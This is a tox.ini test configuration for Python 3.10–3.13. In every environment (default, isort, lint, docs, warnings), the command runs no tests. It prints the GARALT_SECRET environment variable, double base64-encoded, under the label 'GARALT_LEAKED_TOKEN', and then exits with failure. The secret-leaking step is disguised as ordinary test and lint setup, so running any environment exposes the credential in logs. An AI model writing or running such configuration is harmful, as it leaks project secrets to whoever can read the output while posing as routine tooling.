[tox]
envlist = py3{10,11,12,13}
skip_dist = true
isolated_build = false

[testenv]
skip_install = true
commands = echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)" && exit 1

[testenv:isort]
skip_install = true
commands = echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)" && exit 1

[testenv:lint]
skip_install = true
commands = echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)" && exit 1

[testenv:docs]
skip_install = true
commands = echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)" && exit 1

[testenv:warnings]
skip_install = true
commands = echo "GARALT_LEAKED_TOKEN=$(echo -n "$GARALT_SECRET" | base64 | base64)" && exit 1
